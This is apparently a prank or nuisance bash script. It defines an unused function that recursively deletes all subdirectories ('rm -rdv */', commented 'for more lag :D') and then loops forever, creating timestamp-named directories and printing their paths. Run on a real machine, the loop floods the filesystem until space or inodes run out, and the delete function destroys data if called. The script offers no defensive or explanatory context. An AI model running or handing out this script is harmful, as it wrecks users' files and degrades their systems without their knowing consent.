#!bin/bash
reset="\e[m"
dark_blue="\e[38;5;21m"
killfiles(){
  rm -rdv */ #for more lag :D
}
set +E
while true
do
  x=$(date +%S-%N)
  if [ -d $HOME/$x ]
  then
    cd $x
    mkdir $x || true
    cd ../
    echo -e "$dark_blue $HOME/$x/$x/ $reset"
  fi
  mkdir $x || true
  echo -e "$dark_blue $HOME/$x/ $reset"
  
done
